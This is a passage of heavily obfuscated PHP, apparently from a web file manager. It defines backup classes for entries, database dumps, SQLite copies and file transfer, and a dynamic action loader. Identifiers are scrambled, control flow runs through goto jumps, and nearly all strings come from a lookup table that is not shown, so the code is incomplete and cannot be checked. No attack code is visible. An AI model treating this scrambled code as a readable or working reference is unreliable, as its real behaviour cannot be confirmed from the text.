$_SERVER[İë¬“ÅÒÛ›]; $b¯¶ÌÌÎ¬ = parent::listData($Bé³Ş©ÉÕ‘); $C±Õº’â±  = $this->findByName($cˆ÷­¿ùÕ[$cÍ×”¿Ñ[28]]); goto a§ùÈ”‡ªø; D¾ÒÃ¾İºÌ: return parent::update($Bé³Ş©ÉÕ‘, $cˆ÷­¿ùÕ); goto DÔÇ‘õé; DÔÇ‘õé: } public function remove($b£‘¤„¯à) { $D²æŒÃ°ª = parent::listData($b£‘¤„¯à); if (!$D²æŒÃ°ª || $D²æŒÃ°ª[$_SERVER[İë¬“ÅÒÛ›][827]]) { return !1; } return parent::remove($b£‘¤„¯à); } public function add($e§…öªê““) { goto fô­¼Ú¤Í†; cî›¾Ë­ë¯: return parent::insert($e§…öªê““); goto AáİÓƒ¶İ‰; fô­¼Ú¤Í†: $f±Çë‰¨Úä =& $_SERVER[İë¬“ÅÒÛ›]; $E‰À›Çãß¾ = $e§…öªê““[$f±Çë‰¨Úä[28]]; if ($this->findByName($E‰À›Çãß¾)) { return !1; } goto Eªˆö½ñÓİ; Eªˆö½ñÓİ: $FÇÁ­»™ãÖ = array($f±Çë‰¨Úä[388] => $E‰À›Çãß¾, $f±Çë‰¨Úä[1552] => $f±Çë‰¨Úä[33], $f±Çë‰¨Úä[1548] => $f±Çë‰¨Úä[1565], $f±Çë‰¨Úä[1903] => 1, $f±Çë‰¨Úä[1551] => 0, $f±Çë‰¨Úä[1904] => 0, $f±Çë‰¨Úä[1550] => $this->getSort()); $e§…öªê““ = array_merge($FÇÁ­»™ãÖ, $e§…öªê““); $this->filterAuth($e§…öªê““[$f±Çë‰¨Úä[550]]); goto cî›¾Ë­ë¯; AáİÓƒ¶İ‰: } private function getSort() { $d¦Œ¸¸ÄƒÙ =& $_SERVER[İë¬“ÅÒÛ›]; $BÃ› ñˆÙØ = parent::listData(); $f¿Š¡’®‡‘ = array_to_keyvalue($BÃ› ñˆÙØ, $d¦Œ¸¸ÄƒÙ[33], $d¦Œ¸¸ÄƒÙ[1567]); return empty($f¿Š¡’®‡‘) ? 0 : max($f¿Š¡’®‡‘) + 1; } private function filterAuth(&$cöä¶è¯òŠ) { $DÖÒ ‡×Û =& $_SERVER[İë¬“ÅÒÛ›]; $f°¾¯Š‡ = array(); $E¸Ô˜ÒĞ· = array_filter(explode($DÖÒ ‡×Û[47], $cöä¶è¯òŠ)); foreach ($E¸Ô˜ÒĞ· as $cöä¶è¯òŠ) { $eÓÒ†ã”ïÚ = explode($DÖÒ ‡×Û[92], $cöä¶è¯òŠ); if ($eÓÒ†ã”ïÚ[0] == $DÖÒ ‡×Û[1213] && $eÓÒ†ã”ïÚ[1] != $DÖÒ ‡×Û[788]) { $eÛ¡šÇ÷ = $eÓÒ†ã”ïÚ[0] . $DÖÒ ‡×Û[92] . $eÓÒ†ã”ïÚ[1] . $DÖÒ ‡×Û[1905]; if (!in_array($eÛ¡šÇ÷, $E¸Ô˜ÒĞ·)) { $f°¾¯Š‡[] = $eÛ¡šÇ÷; } } $f°¾¯Š‡[] = $cöä¶è¯òŠ; } $cöä¶è¯òŠ = implode($DÖÒ ‡×Û[47], $f°¾¯Š‡); } public function sort($B§õéâç£Í, $CÔÒ¤ÔÄ¤) { return parent::update($B§õéâç£Í, $CÔÒ¤ÔÄ¤); } } goto AÅ£²İ¬èÕ; d‘…İŸ…Ì‰: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $EÁõ„Ùïòé =& $_SERVER[İë¬“ÅÒÛ›]; self::$name = date($EÁõ„Ùïòé[445]); if (!($dÊÍ†Ë¬‡Ö = Model($EÁõ„Ùïòé[446])->lastItem())) { $dÊÍ†Ë¬‡Ö = $this->initData(); } else { self::$name = $dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[28]]; if ($dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[447]] == $EÁõ„Ùïòé[377]) { self::$name = date($EÁõ„Ùïòé[448]); $f†­Ğ“™î² = 0; if (isset($dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[285]][$EÁõ„Ùïòé[164]][$EÁõ„Ùïòé[383]])) { $f†­Ğ“™î² = (int) $dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[285]][$EÁõ„Ùïòé[164]][$EÁõ„Ùïòé[383]]; } if ($dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[28]] == self::$name) { Model($EÁõ„Ùïòé[446])->remove($dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[369]]); } $dÊÍ†Ë¬‡Ö = $this->initData($f†­Ğ“™î², $dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[449]]); } else { $this->checkStore($dÊÍ†Ë¬‡Ö[$EÁõ„Ùïòé[449]]); } } self::$option = $dÊÍ†Ë¬‡Ö; } private function initData($f¤˜·º˜‹ğ = 0, $E‡©¿©Ä×» = '') { goto Fƒ©ŒÎå¦Í; aí¸í¤ÚÑ‡: $this->checkStore($A©Æ˜’ˆ×à[$C¯á˜›Œ¸[449]]); $B›Œ¾Ó’‰š = array($C¯á˜›Œ¸[449] => $A©Æ˜’ˆ×à[$C¯á˜›Œ¸[449]], $C¯á˜›Œ¸[28] => self::$name, $C¯á˜›Œ¸[447] => 0, $C¯á˜›Œ¸[450] => $A©Æ˜’ˆ×à[$C¯á˜›Œ¸[450]], $C¯á˜›Œ¸[285] => array($C¯á˜›Œ¸[451] => array($C¯á˜›Œ¸[447] => 0), $C¯á˜›Œ¸[452] => array($C¯á˜›Œ¸[447] => 0, $C¯á˜›Œ¸[453] => 0, $C¯á˜›Œ¸[454] => 0, $C¯á˜›Œ¸[29] => $C¯á˜›Œ¸[33]), $C¯á˜›Œ¸[455] => array($C¯á˜›Œ¸[447] => 0, $C¯á˜›Œ¸[453] => 0, $C¯á˜›Œ¸[454] => 0), $C¯á˜›Œ¸[164] => array($C¯á˜›Œ¸[447] => 0, $C¯á˜›Œ¸[456] => 0, $C¯á˜›Œ¸[457] => 0, $C¯á˜›Œ¸[458] => 0, $C¯á˜›Œ¸[459] => 0, $C¯á˜›Œ¸[383] => $f¤˜·º˜‹ğ)), $C¯á˜›Œ¸[460] => time(), $C¯á˜›Œ¸[461] => 0); $Bí¦íˆ¾¯ = Model($C¯á˜›Œ¸[446])->insert($B›Œ¾Ó’‰š); goto cÑìËŞ„; cÑìËŞ„: $B›Œ¾Ó’‰š[$C¯á˜›Œ¸[369]] = $Bí¦íˆ¾¯; return $B›Œ¾Ó’‰š; goto Aë‰˜£ºì­; Fƒ©ŒÎå¦Í: $C¯á˜›Œ¸ =& $_SERVER[İë¬“ÅÒÛ›]; $A©Æ˜’ˆ×à = Model($C¯á˜›Œ¸[446])->config(); if ($E‡©¿©Ä×» && $A©Æ˜’ˆ×à[$C¯á˜›Œ¸[449]] != $E‡©¿©Ä×») { $f¤˜·º˜‹ğ = 0; } goto aí¸í¤ÚÑ‡; Aë‰˜£ºì­: } private function checkStore($cÓò™í…Œ†) { $d½¯ÏÔ¿×Ñ =& $_SERVER[İë¬“ÅÒÛ›]; $fÀÅŒ‚¹³ = Model($d½¯ÏÔ¿×Ñ[462])->listData($cÓò™í…Œ†); Model($d½¯ÏÔ¿×Ñ[462])->checkConfig($fÀÅŒ‚¹³); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[İë¬“ÅÒÛ›][446])->findByName(self::$name); } return self::$option; } public static function set($dÜ‚ˆ¨›¨¾) { $E²’³Øø â =& $_SERVER[İë¬“ÅÒÛ›]; $DÅÃŒ‡Šœ = self::get(); foreach ($dÜ‚ˆ¨›¨¾ as $a¾è¥ŒÃÔå => $dç™‰™È¨ë) { $Aóë¨¥‘¦Ù = explode($E²’³Øø â[92], $a¾è¥ŒÃÔå); $A¢ˆàŒä = count($Aóë¨¥‘¦Ù); switch ($A¢ˆàŒä) { case 1: $DÅÃŒ‡Šœ[$Aóë¨¥‘¦Ù[0]] = $dç™‰™È¨ë; break; case 2: $DÅÃŒ‡Šœ[$Aóë¨¥‘¦Ù[0]][$Aóë¨¥‘¦Ù[1]] = $dç™‰™È¨ë; break; case 3: $DÅÃŒ‡Šœ[$Aóë¨¥‘¦Ù[0]][$Aóë¨¥‘¦Ù[1]][$Aóë¨¥‘¦Ù[2]] = $dç™‰™È¨ë; break; } } Model($E²’³Øø â[446])->update($DÅÃŒ‡Šœ[$E²’³Øø â[369]], $DÅÃŒ‡Šœ); self::$option = $DÅÃŒ‡Šœ; return self::$option; } public function keep() { $DÒ›ØºŠ‹¿ =& $_SERVER[İë¬“ÅÒÛ›]; $dïğ¬ˆİ… = self::get(); if ($dïğ¬ˆİ…[$DÒ›ØºŠ‹¿[285]][$DÒ›ØºŠ‹¿[451]][$DÒ›ØºŠ‹¿[447]] == $DÒ›ØºŠ‹¿[377]) { return; } $this->backupKeep($dïğ¬ˆİ…); self::set(array($DÒ›ØºŠ‹¿[463] => 1)); } private function backupKeep($CŞ¿²Á²) { goto a°›¿õ›§¯; a°›¿õ›§¯: $C¥©Ü¥‹ˆ =& $_SERVER[İë¬“ÅÒÛ›]; $dÉ§¼…îóì = Model($C¥©Ü¥‹ˆ[446])->listData(); if (empty($dÉ§¼…îóì)) { return; } goto EëÌã¿·Ó; EëÌã¿·Ó: $e›¬µ‹¹› = array(); for ($c«±¯¨­õµ = 0; $c«±¯¨­õµ <= 7; $c«±¯¨­õµ++) { $e›¬µ‹¹›[] = date($C¥©Ü¥‹ˆ[448], strtotime("\x2d{$c«±¯¨­õµ}\x20\144\x61\171\x73")); } for ($c«±¯¨­õµ = 0; $c«±¯¨­õµ < 12; $c«±¯¨­õµ++) { $e›¬µ‹¹›[] = date($C¥©Ü¥‹ˆ[464], strtotime("\55{$c«±¯¨­õµ}\x20\155\157\156\x74\150\163")); } goto C„ä‘»‰¬œ; C„ä‘»‰¬œ: $e›¬µ‹¹› = array_unique($e›¬µ‹¹›); foreach ($dÉ§¼…îóì as $fŒ‚Ô©·Ú¹) { if (!empty($fŒ‚Ô©·Ú¹[$C¥©Ü¥‹ˆ[28]]) && in_array($fŒ‚Ô©·Ú¹[$C¥©Ü¥‹ˆ[28]], $e›¬µ‹¹›)) { continue; } Model($C¥©Ü¥‹ˆ[446])->remove($fŒ‚Ô©·Ú¹[$C¥©Ü¥‹ˆ[369]]); $F†×ÖÛÎ» = "\x7b\x69\157\72{$CŞ¿²Á²[$C¥©Ü¥‹ˆ[449]]}\175\57\x64\x61\x74\x61\x62\x61\163\x65\x2f\x62\141\x63\153\x75\160\137{$fŒ‚Ô©·Ú¹[$C¥©Ü¥‹ˆ[28]]}"; IO::remove($F†×ÖÛÎ», !1); } goto D•«—øñ…¬; D•«—øñ…¬: } public function db() { goto f©Õİ²…Ã¹; f©Õİ²…Ã¹: $CÁ‹µ™Ô§¬ =& $_SERVER[İë¬“ÅÒÛ›]; $BƒÅ‡¼ë›´ = self::get(); if ($BƒÅ‡¼ë›´[$CÁ‹µ™Ô§¬[285]][$CÁ‹µ™Ô§¬[452]][$CÁ‹µ™Ô§¬[447]] == $CÁ‹µ™Ô§¬[377]) { return !0; } goto AÅ¢½·‰Ü; AÅ¢½·‰Ü: $C†¯¹»ŒäÅ = new BackupDb(); if (!$C†¯¹»ŒäÅ->index()) { return !1; } self::set(array($CÁ‹µ™Ô§¬[465] => 1)); goto DŞ‘Ó»áÄ„; DŞ‘Ó»áÄ„: return !0; goto eìÌ¿«ñ–í; eìÌ¿«ñ–í: } public function dbFile() { goto d”¦À— æ–; d”¦À— æ–: $C³Å›²¾Å =& $_SERVER[İë¬“ÅÒÛ›]; $DÊ¤éÅ…Š« = self::get(); if ($DÊ¤éÅ…Š«[$C³Å›²¾Å[285]][$C³Å›²¾Å[455]][$C³Å›²¾Å[447]] == $C³Å›²¾Å[377]) { return !0; } goto AÉËÏÇŞİ’; AÉËÏÇŞİ’: $e¹’á£‘® = new BackupDbFile(); if (!$e¹’á£‘®->index()) { return !1; } self::set(array($C³Å›²¾Å[466] => 1)); goto Cßòé•³‚Ï; Cßòé•³‚Ï: return !0; goto FŠ±¤Ù½ó¡; FŠ±¤Ù½ó¡: } public function file() { $Aàõ‘ò¯¥ =& $_SERVER[İë¬“ÅÒÛ›]; $EÖÀÄÍ»Úí = self::get(); if ($EÖÀÄÍ»Úí[$Aàõ‘ò¯¥[285]][$Aàõ‘ò¯¥[164]][$Aàõ‘ò¯¥[447]] == $Aàõ‘ò¯¥[377]) { return !0; } if (!isset($EÖÀÄÍ»Úí[$Aàõ‘ò¯¥[450]]) || $EÖÀÄÍ»Úí[$Aàõ‘ò¯¥[450]] == $Aàõ‘ò¯¥[403]) { $CÇšßÆ±“ù = new BackupFile(); if (!$CÇšßÆ±“ù->index()) { return !1; } } self::set(array($Aàõ‘ò¯¥[467] => 1, $Aàõ‘ò¯¥[447] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto a£¹™ğ‡Ñ‘; B®éˆ­¬: $C›µéš×ÍÓ = Model()->db()->getTables(); foreach ($C›µéš×ÍÓ as $FâÏà§ÃÖƒ) { $fô–ŒæŞõ += Model($FâÏà§ÃÖƒ)->count(); } $cÜ×…‹óÔÃ = new Task($EØÆÈİÔ£[468], $EØÆÈİÔ£[469], $fô–ŒæŞõ, LNG($EØÆÈİÔ£[470]) . $EØÆÈİÔ£[471] . LNG($EØÆÈİÔ£[472])); goto eæ‚âÚ÷å¥; c òÓ‘•ÇÖ: $a±Ú‰“¹Ôå = TEMP_FILES . $EØÆÈİÔ£[476] . self::$name . $EØÆÈİÔ£[8]; del_dir($a±Ú‰“¹Ôå); mk_dir($a±Ú‰“¹Ôå); goto FÓ©„‹µ–È; C½ï´œ®ÂÔ: self::$name = $aèŞÃÅ†æ‚[$EØÆÈİÔ£[28]]; if ($dÊ‘Š¨ Áö = $this->sqliteFile()) { return $this->sqliteBackup($dÊ‘Š¨ Áö); } $fô–ŒæŞõ = 0; goto B®éˆ­¬; dö°éß…‰Ñ: Backup::set($CåÍêŠİ£µ); return !0; goto f£ŞÑÄÄß; eæ‚âÚ÷å¥: $CåÍêŠİ£µ = array($EØÆÈİÔ£[473] => $EØÆÈİÔ£[474], $EØÆÈİÔ£[475] => $fô–ŒæŞõ + 1); Backup::set($CåÍêŠİ£µ); $B¤ƒŠ¨ŒŸå = 0; goto c òÓ‘•ÇÖ; FÓ©„‹µ–È: foreach ($C›µéš×ÍÓ as $FâÏà§ÃÖƒ) { $cˆÒö»Ê = "{$a±Ú‰“¹Ôå}{$FâÏà§ÃÖƒ}\x2e\163\161\154"; $B¤ƒŠ¨ŒŸå += $this->makeSqlFile($FâÏà§ÃÖƒ, $cˆÒö»Ê, $cÜ×…‹óÔÃ, $aèŞÃÅ†æ‚); } $cÜ×…‹óÔÃ->end(); $CåÍêŠİ£µ = array($EØÆÈİÔ£[465] => 1, $EØÆÈİÔ£[477] => $B¤ƒŠ¨ŒŸå); goto dö°éß…‰Ñ; a£¹™ğ‡Ñ‘: $EØÆÈİÔ£ =& $_SERVER[İë¬“ÅÒÛ›]; $aèŞÃÅ†æ‚ = Backup::get(); self::$io = $aèŞÃÅ†æ‚[$EØÆÈİÔ£[449]]; goto C½ï´œ®ÂÔ; f£ŞÑÄÄß: } public function makeSqlFile($eÏ¸„ˆ¡, $B¿‰©Ÿ‹ò÷, $bå§½ ¸, $bœ¹µßÌÒÚ) { goto bŒ³™³›âØ; B†£êˆÇ²²: $cĞÈï»…ï¦ = Model($eÏ¸„ˆ¡)->getDbFields(); do { $C×Ÿã„­Á† = Model($eÏ¸„ˆ¡)->field($cĞÈï»…ï¦)->order($D¡Û×Ì . $_SERVER[İë¬“ÅÒÛ›][479])->selectPage($CÅÖ×ÀÜ¡ö, $aÅš¯ñ´Æ); $AôŒ•Á»öÒ = !empty($C×Ÿã„­Á†[$_SERVER[İë¬“ÅÒÛ›][357]]) ? $C×Ÿã„­Á†[$_SERVER[İë¬“ÅÒÛ›][357]] : array(); $cˆôƒ  ¤ö = array(); foreach ($AôŒ•Á»öÒ as $DÓë…„‹—È) { if ($eÏ¸„ˆ¡ == $_SERVER[İë¬“ÅÒÛ›][480] && (!isset($bœ¹µßÌÒÚ[$_SERVER[İë¬“ÅÒÛ›][450]]) || $bœ¹µßÌÒÚ[$_SERVER[İë¬“ÅÒÛ›][450]] == $_SERVER[İë¬“ÅÒÛ›][403])) { $DÓë…„‹—È[$_SERVER[İë¬“ÅÒÛ›][76]] = "\173\x69\x6f\x3a{$Dáš¨•ÃßÒ}\175" . substr($DÓë…„‹—È[$_SERVER[İë¬“ÅÒÛ›][76]], strlen("\x7b\151\x6f\72{$DÓë…„‹—È[$_SERVER[İë¬“ÅÒÛ›][481]]}\x7d")); $DÓë…„‹—È[$_SERVER[İë¬“ÅÒÛ›][481]] = $Dáš¨•ÃßÒ; } $cˆôƒ  ¤ö[] = $_SERVER[İë¬“ÅÒÛ›][482] . $this->addSqlSlashes($DÓë…„‹—È) . $_SERVER[İë¬“ÅÒÛ›][483]; } if ($E¢äî†ˆ•¢ = count($AôŒ•Á»öÒ)) { $dŠá½ˆçÚ = "\x49\x4e\x53\105\122\124\40\x49\116\124\117\40\x60{$eÏ¸„ˆ¡}\140\x20\x28\x60" . implode($_SERVER[İë¬“ÅÒÛ›][484], $cĞÈï»…ï¦) . $_SERVER[İë¬“ÅÒÛ›][485]; fwrite($BßÙ°¶Ä‹, $dŠá½ˆçÚ . implode($_SERVER[İë¬“ÅÒÛ›][486], $cˆôƒ  ¤ö) . $_SERVER[İë¬“ÅÒÛ›][68] . PHP_EOL); $bå§½ ¸->update($E¢äî†ˆ•¢); } $aÅš¯ñ´Æ++; $eÖŒöŒ›ø× += $E¢äî†ˆ•¢; } while ($E¢äî†ˆ•¢ == $CÅÖ×ÀÜ¡ö); fclose($BßÙ°¶Ä‹); goto C¶¥÷ğßØŠ; fÄ·§Õ¶—Ï: $CÅÖ×ÀÜ¡ö = 2000; $BßÙ°¶Ä‹ = fopen($B¿‰©Ÿ‹ò÷, $_SERVER[İë¬“ÅÒÛ›][478]); $D¡Û×Ì = Model($eÏ¸„ˆ¡)->getPk(); goto B†£êˆÇ²²; bŒ³™³›âØ: $Dáš¨•ÃßÒ = self::$io; $eÖŒöŒ›ø× = 0; $aÅš¯ñ´Æ = 1; goto fÄ·§Õ¶—Ï; C¶¥÷ğßØŠ: return $eÖŒöŒ›ø×; goto A¾çšéô…; A¾çšéô…: } private function addSqlSlashes($c”ÆšéÃ¸) { $A¯ó™ˆğ =& $_SERVER[İë¬“ÅÒÛ›]; $EùŠŒ‚„Ô = array(); foreach ($c”ÆšéÃ¸ as $bÍ¨ÍÖäá) { if (is_array($bÍ¨ÍÖäá)) { $bÍ¨ÍÖäá = json_encode_force($bÍ¨ÍÖäá); } $bÍ¨ÍÖäá = addslashes($bÍ¨ÍÖäá); $bÍ¨ÍÖäá = str_replace(array($A¯ó™ˆğ[487], $A¯ó™ˆğ[224]), array($A¯ó™ˆğ[488], $A¯ó™ˆğ[489]), $bÍ¨ÍÖäá); $EùŠŒ‚„Ô[] = $bÍ¨ÍÖäá; } return $A¯ó™ˆğ[55] . implode($A¯ó™ˆğ[490], $EùŠŒ‚„Ô) . $A¯ó™ˆğ[55]; } private function sqliteFile() { $cä”†²æ­½ =& $_SERVER[İë¬“ÅÒÛ›]; $c…•¾«‡‘‡ = null; $b’˜ÉëÆÎÅ = $GLOBALS[$cä”†²æ­½[6]][$cä”†²æ­½[17]]; if ($b’˜ÉëÆÎÅ[$cä”†²æ­½[491]] == $cä”†²æ­½[492]) { $bª¯‚× ìÔ = explode($cä”†²æ­½[493], $b’˜ÉëÆÎÅ[$cä”†²æ­½[494]]); if (substr($bª¯‚× ìÔ[0], 0, 6) == $cä”†²æ­½[9]) { $c…•¾«‡‘‡ = $bª¯‚× ìÔ[1]; } } else { if (substr($b’˜ÉëÆÎÅ[$cä”†²æ­½[491]], 0, 6) == $cä”†²æ­½[9]) { $c…•¾«‡‘‡ = $b’˜ÉëÆÎÅ[$cä”†²æ­½[238]]; } } return $c…•¾«‡‘‡; } public function sqliteBackup($AŞ‘›Æî‹) { goto fğ„‘ÛÎÆÜ; aÑÍÊÃ®³ˆ: $eç×ÍŞÆéá->task[$Eò‡ï‹‚‘”[456]] = $D´ÑŠë›íŸ; IO::copy($bœÀ‘Š¢îÓ . $Eò‡ï‹‚‘”[501], $Cæ‚»“¿Œ¿); IO::copy($AŞ‘›Æî‹, $Cæ‚»“¿Œ¿); goto cèÜ¾»Éèå; eç½Ííç¯§: $Cæ‚»“¿Œ¿ = "\173\151\x6f\72{$B‡Ùö­‰â‚}\x7d\57\x64\141\x74\x61\x62\x61\x73\145\x2f\142\x61\143\x6b\165\x70\137" . self::$name . $Eò‡ï‹‚‘”[496]; if (!IO::exist($Cæ‚»“¿Œ¿)) { IO::mkdir($Cæ‚»“¿Œ¿); } $D´ÑŠë›íŸ = IO::size($AŞ‘›Æî‹); goto c¹¾óº‡ßï; cÌ‹»ÜÍ³³: return !1; goto aßÅ´ÃÕÚ½; fğ„‘ÛÎÆÜ: $Eò‡ï‹‚‘” =& $_SERVER[İë¬“ÅÒÛ›]; $B‡Ùö­‰â‚ = self::$io; $bœÀ‘Š¢îÓ = CONTROLLER_DIR . $Eò‡ï‹‚‘”[495]; goto eç½Ííç¯§; cèÜ¾»Éèå: $eç×ÍŞÆéá->end(); $E‰ÁÂƒàÙ‹ = array($Eò‡ï‹‚‘”[465] => 1, $Eò‡ï‹‚‘”[477] => 1, $Eò‡ï‹‚‘”[466] => 1, $Eò‡ï‹‚‘”[502] => $D´ÑŠë›íŸ); Backup::set($E‰ÁÂƒàÙ‹); goto cÌ‹»ÜÍ³³; c¹¾óº‡ßï: $E‰ÁÂƒàÙ‹ = array($Eò‡ï‹‚‘”[473] => $Eò‡ï‹‚‘”[9], $Eò‡ï‹‚‘”[475] => 1, $Eò‡ï‹‚‘”[497] => $D´ÑŠë›íŸ); Backup::set($E‰ÁÂƒàÙ‹); $eç×ÍŞÆéá = new TaskFileTransfer($Eò‡ï‹‚‘”[498], $Eò‡ï‹‚‘”[469], 1, LNG($Eò‡ï‹‚‘”[470]) . $Eò‡ï‹‚‘”[499] . LNG($Eò‡ï‹‚‘”[472]) . $Eò‡ï‹‚‘”[500]); goto aÑÍÊÃ®³ˆ; aßÅ´ÃÕÚ½: } } class BackupDbFile { public function __construct() { } public function index() { goto f…¾šÇ±•à; f…¾šÇ±•à: $f°‡Ì«‘— =& $_SERVER[İë¬“ÅÒÛ›]; $C§®Ä¤¼ºâ = Backup::get(); $A™éÕ½…ä® = $C§®Ä¤¼ºâ[$f°‡Ì«‘—[28]]; goto B„öëÜÛ“ƒ; B„öëÜÛ“ƒ: $Aõ¯ÁØŠŞŒ = TEMP_FILES . "\142\x61\143\153\165\x70\x5f{$A™éÕ½…ä®}\x2f"; $d¢ãîàÔ¨£ = "\173\x69\x6f\x3a{$C§®Ä¤¼ºâ[$f°‡Ì«‘—[449]]}\x7d\57\x64\141\164\141\x62\x61\x73\145\57"; IO::mkdir($d¢ãîàÔ¨£ . "\142\x61\143\153\x75\160\137{$A™éÕ½…ä®}\x2f"); goto Bõ‰“½³‰–; EøÆ•ìï·: return !0; goto B‰Èˆ›ŸÙ­; Bõ‰“½³‰–: $b’Œ¡òİïŸ = new TaskFileTransfer($f°‡Ì«‘—[498], $f°‡Ì«‘—[469], 0, LNG($f°‡Ì«‘—[470]) . $f°‡Ì«‘—[499] . LNG($f°‡Ì«‘—[472]) . $f°‡Ì«‘—[500]); $b’Œ¡òİïŸ->addPath($Aõ¯ÁØŠŞŒ); $fáˆ¤ÊÒÀÆ = IO::infoWithChildren($Aõ¯ÁØŠŞŒ); goto EƒØÖÎìÙÄ; EƒØÖÎìÙÄ: Backup::set(array($f°‡Ì«‘—[497] => $fáˆ¤ÊÒÀÆ[$f°‡Ì«‘—[78]])); IO::move($Aõ¯ÁØŠŞŒ, $d¢ãîàÔ¨£); $aÅ¶“óÚ¢Â = CONTROLLER_DIR . $f°‡Ì«‘—[503]; goto C©©–á¹´; C©©–á¹´: IO::copy($aÅ¶“óÚ¢Â, $d¢ãîàÔ¨£ . "\x62\141\143\153\x75\160\137{$A™éÕ½…ä®}\57"); $b’Œ¡òİïŸ->end(); Backup::set(array($f°‡Ì«‘—[502] => $fáˆ¤ÊÒÀÆ[$f°‡Ì«‘—[78]])); goto EøÆ•ìï·; B‰Èˆ›ŸÙ­: } } goto a˜¨©İ‰¦á; fÀø¸÷”ùÛ: function Action($B÷ï§ŸÚ‘» = '') { goto E®”Â’¾˜Å; E®”Â’¾˜Å: $c‰¶“¦‹ =& $_SERVER[…Ã²ÛÚÈÔ]; static $cÁìæš¿Ó = array(); $B÷ï§ŸÚ‘» = trim(str_replace($c‰¶“¦‹[2], $c‰¶“¦‹[3], $B÷ï§ŸÚ‘»), $c‰¶“¦‹[2]); goto a¹±ÛÑĞ­ê; a¹±ÛÑĞ­ê: $fšÂë‰©ÂÊ = explode($c‰¶“¦‹[3], $B÷ï§ŸÚ‘»); $cìİò¤²² = strtolower($fšÂë‰©ÂÊ[0]); if (substr($cìİò¤²², -6) == $c‰¶“¦‹[4]) { $B÷ï§ŸÚ‘» = substr($fšÂë‰©ÂÊ[0], 0, -6); $a˜–Ÿ“·À = $B÷ï§ŸÚ‘» . $c‰¶“¦‹[5]; $Cë‡ÅÊéÕ = $c‰¶“¦‹[6]; if (isset($fšÂë‰©ÂÊ[1]) && substr(strtolower($fšÂë‰©ÂÊ[1]), -5) == $c‰¶“¦‹[7]) { $a˜–Ÿ“·À = $B÷ï§ŸÚ‘» . $fšÂë‰©ÂÊ[1]; $Cë‡ÅÊéÕ = $c‰¶“¦‹[8] . $fšÂë‰©ÂÊ[1] . $c‰¶“¦‹[9]; } else { if (count($fšÂë‰©ÂÊ) == 3) { $a˜–Ÿ“·À = $B÷ï§ŸÚ‘» . $fšÂë‰©ÂÊ[1] . $fšÂë‰©ÂÊ[2]; $Cë‡ÅÊéÕ = $c‰¶“¦‹[10] . $fšÂë‰©ÂÊ[1] . $c‰¶“¦‹[11] . $fšÂë‰©ÂÊ[2] . $c‰¶“¦‹[9]; } } $Cë‡ÅÊéÕ = PLUGIN_DIR . $B÷ï§ŸÚ‘» . $c‰¶“¦‹[2] . $Cë‡ÅÊéÕ; } else { if (substr($cìİò¤²², -5) == $c‰¶“¦‹[7]) { $B÷ï§ŸÚ‘» = substr($fšÂë‰©ÂÊ[0], 0, -5); return Model($B÷ï§ŸÚ‘»); } else { $a˜–Ÿ“·À = $fšÂë‰©ÂÊ[0] . $fšÂë‰©ÂÊ[1]; $Cë‡ÅÊéÕ = CONTROLLER_DIR . $fšÂë‰©ÂÊ[0] . $c‰¶“¦‹[2] . $fšÂë‰©ÂÊ[1] . $c‰¶“¦‹[12]; } } goto b‡Æ°Ô•é©; F©Â•‚ƒ: if (!class_exists($a˜–Ÿ“·À)) { return actionCallError("\x5b{$B÷ï§ŸÚ‘»}\x20\x3d\x3e\x20{$a˜–Ÿ“·À}\135\x20\143\154\x61\x73\163\40\156\x6f\x74\40\145\170\x69\163\164\x73\41"); } $cÁìæš¿Ó[$Føê†‹é¦Ê] = new $a˜–Ÿ“·À(); return $cÁìæš¿Ó[$Føê†‹é¦Ê]; goto bÕÅ÷Ë·; b‡Æ°Ô•é©: $Føê†‹é¦Ê = strtolower($a˜–Ÿ“·À); if (isset($cÁìæš¿Ó[$Føê†‹é¦Ê])) { return $cÁìæš¿Ó[$Føê†‹é¦Ê]; } if (is_file($Cë‡ÅÊéÕ)) { include_once $Cë‡ÅÊéÕ; } goto F©Â•‚ƒ; bÕÅ÷Ë·: } function ActionApply($dÍ‘å §ä, $dœÉ³»¹Ú› = array()) { goto dœ„ê¬‹ê…; EĞ×¦ê¢Ã: $fëÒÍ‰ƒ† = substr($dÍ‘å §ä, 0, $DáÃÌƒêÒ); $f‹İãù²Ç = substr($dÍ‘å §ä, $DáÃÌƒêÒ + 1); $C½·ÏØÏÌÜ = Action($fëÒÍ‰ƒ†); goto DÑÄ‡Ä¾áË; dœ„ê¬‹ê…: if (is_array($dÍ‘å §ä)) { return call_user_func_array($dÍ‘å §ä, $dœÉ³»¹Ú›); } if (function_exists($dÍ‘å §ä)) { return call_user_func_array($dÍ‘å §ä, $dœÉ³»¹Ú›); } $DáÃÌƒêÒ = strrpos($dÍ‘å §ä, $_SERVER[…Ã²ÛÚÈÔ][3]); goto EĞ×¦ê¢Ã; DÑÄ‡Ä¾áË: if (!method_exists($C½·ÏØÏÌÜ, $f‹İãù²Ç)) { return actionCallError("{$dÍ‘å §ä}\40\x6d\x65\164\150\157\144\40\x6e\157\164\x20\x65\170\151\x73\164\x73\x21"); } $EÔ¾½„ÏÂ… = call_user_func_array(array($C½·ÏØÏÌÜ, $f‹İãù²Ç), $dœÉ³»¹Ú›); return $EÔ¾½„ÏÂ…; goto C¤ø•¤²²š; C¤ø•¤²²š: } function actionCallError($CºŠªó²•¸) { $Dâ‘ŸµèÙ´ =& $_SERVER[…Ã²ÛÚÈÔ]; $fƒ‡¦´Îéô = json_encode_force(array($Dâ‘ŸµèÙ´[13] => this_url(), $Dâ‘ŸµèÙ´[14] => $GLOBALS[$Dâ‘ŸµèÙ´[14]])); $fƒ‡¦´Îéô = str_replace(array($Dâ‘ŸµèÙ´[15]), array($Dâ‘ŸµèÙ´[2]), $fƒ‡¦´Îéô); return write_log($CºŠªó²•¸ . $Dâ‘ŸµèÙ´[16] . $fƒ‡¦´Îéô, $Dâ‘ŸµèÙ´[17]); } goto dµ‡›»îİÒ; a˜¨©İ‰¦á: class BackupFile { public function __construct() { } public function index() { goto 